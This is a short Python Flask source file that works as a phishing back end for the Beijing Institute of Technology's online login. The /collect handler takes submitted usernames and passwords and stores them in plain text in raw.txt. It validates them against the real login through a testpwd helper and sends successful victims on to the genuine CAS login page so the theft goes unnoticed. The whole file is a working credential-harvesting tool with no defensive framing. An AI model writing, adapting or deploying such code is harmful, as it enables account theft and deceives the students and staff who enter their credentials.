from flask import Flask
from flask import render_template
from flask import redirect
from testpwd import testpwd


# (flask tutorial)https://www.jianshu.com/p/65af61084456
# (flask 摇号查询网页)https://www.jianshu.com/p/65af61084456
# (js两个post) https://zhidao.baidu.com/question/292554507.html
# (flask 后台发送 html)https://www.cnblogs.com/mqxs/p/7904960.html

app = Flask(__name__)


@app.route('/', methods=['GET'])
def hello_world():
    return render_template("index.html")


@app.route('/collect', methods=['GET'])
def collect_get():
    return redirect('/')


@app.route('/collect', methods=['POST'])
def collect_form():
    from flask import request

    official = "https://login.bit.edu.cn/cas/login?service=http%3A%2F%2Fonline.bit.edu.cn%3A80%2Feip%2F"
    online = "http://online.bit.edu.cn/eip/user/index.htm"
    username = request.form['username']
    password = request.form['password']

    with open("raw.txt", "a") as f:
        f.write("{}\t{}\n".format(username, password))

    #return redirect(online)

    html, msg = testpwd(username, password)
    if msg:
        print("incorrect pwd:\n", username, password)
        return render_template("index.html", msg=msg)
    else:
        print("correct pwd:\n",   username, password)
        return redirect(official)


if __name__ == "__main__":
    app.run(debug=False)
